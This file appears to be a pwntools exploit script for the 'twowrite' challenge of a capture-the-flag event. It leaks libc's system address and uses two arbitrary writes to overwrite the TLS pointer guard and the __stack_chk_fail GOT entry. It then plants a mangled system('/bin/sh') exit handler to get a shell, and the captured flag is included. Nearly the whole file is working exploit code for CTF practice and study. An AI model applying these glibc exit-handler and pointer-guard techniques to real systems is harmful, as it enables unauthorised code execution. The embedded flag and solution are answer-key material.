#!/usr/bin/env python3

from pwn import *

exe = ELF('./vuln_patched')
libc = ELF('./libc.so.6')
context.binary = exe

s = lambda a: p.send(a)
sa = lambda a, b: p.sendafter(a, b)
sl = lambda a: p.sendline(a)
sla = lambda a, b: p.sendlineafter(a, b)
lleak = lambda a, b: log.info(a + " = %#x" % b)
rcu = lambda a: p.recvuntil(a)
debug = lambda : gdb.attach(p, gdbscript = script)

def PTR_MANGLE(val,secret):
    rol = lambda val, r_bits, max_bits: \
    (val << r_bits%max_bits) & (2**max_bits-1) | \
    ((val & (2**max_bits-1)) >> (max_bits-(r_bits%max_bits)))
    mangled = val^secret
    mangled = rol(mangled,0x11,64)
    return mangled

def overwrite(addr1, addr2, val1, val2):
	sla(b"what? ", f"{val1}".encode())
	sla(b"what? ", f"{val2}".encode())
	sla(b"where? ", hex(addr1).encode())
	sla(b"where? ", hex(addr2).encode())

script = '''
b *0x4012B3
'''

p = remote("twowrite.chal.imaginaryctf.org", 1337)
#p = process('./vuln_patched')
#p = gdb.debug('./vuln_patched', gdbscript = script)

main = 0x401196
__stack_chk_fail_got = exe.got['__stack_chk_fail']

rcu(b"system @ ")
system = int(p.recvline(), 16)
libc_base = system - libc.symbols['system']
lleak("libc_base", libc_base)

tls_ptrguard = libc_base - 0x2890
lleak("tls_ptrguard", tls_ptrguard)
initial = libc_base + libc.symbols['initial']
binsh = libc_base + list(libc.search(b"/bin/sh\x00"))[0]
exit = libc_base + libc.symbols['exit']
setbuf = libc_base + libc.symbols['setbuf']

# stack guard = stack check fail got = main
# ptr_guard = setbuf got = setvbuf
overwrite(tls_ptrguard - 8, __stack_chk_fail_got, main, setbuf)

# initial + 24 = system (mangled)
# initla + 32 = binsh
mangled = PTR_MANGLE(system, setbuf)
overwrite(initial + 24, 0x404800, mangled, binsh)

p.interactive()
#ictf{d0nt_y0u_l0ve_it_when_the_p0inters_demangle_themselves_77a90021e9a8a690}
